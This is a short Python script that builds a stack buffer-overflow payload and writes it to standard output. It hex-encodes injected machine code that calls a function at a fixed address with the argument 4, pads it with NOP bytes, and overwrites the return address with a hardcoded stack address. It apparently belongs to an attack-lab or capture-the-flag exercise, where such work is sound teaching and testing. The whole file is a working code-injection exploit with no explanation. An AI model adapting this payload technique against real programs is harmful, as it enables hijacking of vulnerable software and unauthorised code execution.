import struct
import sys

code = bytes.fromhex(
    "bf 04 00 00 00 "
    "b8 87 1a 40 00 "
    "ff d0"
)

padding = b"\x90" * (24 - len(code))

stack_code_address = 0x721000800fd0

payload = code
payload += padding
payload += struct.pack("<Q", stack_code_address)

sys.stdout.buffer.write(payload)